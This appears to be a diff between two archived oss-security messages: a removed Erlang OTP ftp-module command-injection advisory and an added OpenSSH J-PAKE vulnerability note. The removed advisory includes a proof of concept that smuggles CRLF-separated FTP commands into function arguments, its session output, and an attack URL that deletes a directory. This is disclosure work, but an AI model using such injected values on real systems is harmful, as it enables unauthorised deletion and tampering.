@@ -1,107 +1,49 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/01/29/3
-Message-ID: <CAM4=iJ2tXAuMETRMLqJAyKbzYTY7R3iN_P9o6DxCUCr+HXdDLA@mail.gmail.com>
-Date: Tue, 28 Jan 2014 22:48:41 +0100
-From: Seba <argos83@...il.com>
-To: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: CVE Request: Erlang OTP - ftp module - FTP Command Injection
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/01/29/2
+Message-ID: <52E877AF.9030205@redhat.com>
+Date: Tue, 28 Jan 2014 20:38:23 -0700
+From: Kurt Seifried <kseifried@...hat.com>
+To: Open Source Security <oss-security@...ts.openwall.com>, Assign a CVE Identifier <cve-assign@...re.org>
+Subject: OpenSSH J-PAKE vulnerability (no cause for panic! remain calm!)
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-This has been reported to erlang-bugs mailing list:
-http://erlang.org/pipermail/erlang-bugs/2014-January/003998.html
+http://www.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/schnorr.c
 
-There is an FTP Command Injection vulnerability in the "ftp" module.
+Revision 1.10: download - view: text, markup, annotated - select for diffs
+Wed Jan 29 00:21:41 2014 UTC (3 hours, 14 minutes ago) by djm
+Branches: MAIN
+CVS tags: HEAD
+Diff to: previous 1.9: preferred, coloured
+Changes since revision 1.9: +4 -1 lines
+In the experimental, never-enabled JPAKE code: clear returned digest and
+length in hash_buffer() for error cases; could lead to memory corruption
+later if EVP_Digest* fails.  Pointed out by Mark Dowd
 
-All those functions that write any string argument in the control
-socket seem to be vulnerable:
+As I understand it this can be enabled via code edit/gcc command line
+options, so not sure if this qualified for a CVE or not (vuln in code,
+yes, is code reachable? not under any default setup, and even on
+non-default you have to go pretty far off to enable it).
 
-user/3
-user/4
-account/2
-cd/2
-ls/2
-nlist/2
-rename/3
-delete/2
-mkdir/2
-rmdir/2
-recv/2
-recv/3
-recv_bin/2,
-recv_chunk_start/2
-send/3
-send_bin/3
-send_chunk_start/2
-append_chunk_start/2
-append/2
-append/3
-append_bin/3
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-Vulnerability Description
--------------------------
-
-By injecting a \r\n sequence followed by a new command in a function
-argument you get the ftp module to write the whole string in the
-socket.
-
-E.g. the following erlang shell session:
-
-1> inets:start().
-ok
-2> {ok, Pid} = inets:start(ftpc, [{host, "127.0.0.1"}]).
-{ok,<0.46.0>}
-3> ftp:user(Pid, "anonymous", "password\r\nCWD pub\r\nMKD new_dir").
-ok
-4> ftp:cd(Pid, "/pub\r\nRMD new_dir\r\nPASV").
-ok
-
-
-Generates the following FTP session:
-
-FTP command: Client "127.0.0.1", "USER anonymous"
-FTP response: Client "127.0.0.1", "331 Please specify the password."
-FTP command: Client "127.0.0.1", "PASS <password>"
-FTP response: Client "127.0.0.1", "230 Login successful."
-FTP command: Client "127.0.0.1", "CWD pub"
-FTP response: Client "127.0.0.1", "250 Directory successfully changed."
-FTP command: Client "127.0.0.1", "MKD new_dir"
-FTP response: Client "127.0.0.1", "257 "/pub/new_dir" created"
-FTP command: Client "127.0.0.1", "CWD /pub"
-FTP response: Client "127.0.0.1", "250 Directory successfully changed."
-FTP command: Client "127.0.0.1", "RMD new_dir"
-FTP response: Client "127.0.0.1", "250 Remove directory operation successful."
-FTP command: Client "127.0.0.1", "PASV"
-FTP response: Client "127.0.0.1", "227 Entering Passive Mode
-(127,0,0,1,130,161)."
-
-
-Attack Scenario Example
------------------------
-
-A web server allow users to navigate and download documents.
-Internally the web server connects to a private ftp server using OTP
-"ftp" module.
-An attacker might take advantage of the vulnerability to execute
-actions that aren't supposed to be exposed. E.g. delete a directory by
-requesting:
-
-http://www.example.com/list_dir.yaws?dir=/docs/%0d%0aRMD+/docs
-
-Tested on
----------
- - Erlang OTP: R15B03
- - Ubuntu 12.04 x86_64
- - FTP Sever: vsftpd
-
-
-Mitigation
-----------
-
-Until this is fixed and the proper sanitization is implemented within
-the ftp module, string arguments should get "\r" and "\n" removed
-before being passed to these functions.
-
-
-Sebastián Tello
+iQIcBAEBAgAGBQJS6HevAAoJEBYNRVNeJnmTFcgP/3oYP20fflvJfWw4prATaws3
+zZT3MFjmzEy6DJFrAsW9VXNYfUsTKxyf+vI4f1njKUUi7MdYb6HTIbeI/9zu8fP3
+zqf3KDLKYZJsO/mC5zm/r+2lduFXNMg8zFkxNci3mNFSwkH0yr4YCaoTlNZlQITY
+2dIZDnS0s+vfumd5Epv1+PRGhGxTOfJQIqSw/Li1YAVcIBPgOthN6Wpo2kiwLuJR
+/AOkSNDOHTq8//xkQLsnaeOxQMqzo+s/NU5oNX7Me9QWmjnKDipEcUVYcbZ9SyhZ
+DcXrxpm9J+iyWCuMgZX8LokscRhmJVi5sJWA4U9xVy/hi0zZYzIQrCXbhEfDM+g3
+sKZWUvWrsoMC5mUhqwQyMGRP0o/qTtBN3qz1gNY0jy0zd0Bzi8Fi7++MGyN7H5pv
+ymLrpiQvKGC3Pu7SPBPcYDi1jdK+VZ9ztFUTxTvkzn0+LjGxf7+GZuPfrn0CH2em
+CeCi4o/CiFI4fKr0cMu10uwBfmGxKKSG+eWjSYySVkvO0xLs9I91Ksby69jTGjAp
+6Ln8XtQgSRDJ6hKba6Wox5RxDiuNhitlUD2mcm+5s1SuV+EQzegaX6CTbaO8Zgy5
+W7QwDU2M1RcY7VTTDrAg2Grscint106UZmZiiOLsT2R3/cbv7EOISgXTybEdPT3g
+bClWQdKuzSxlPrjIp7AT
+=dkva
+-----END PGP SIGNATURE-----
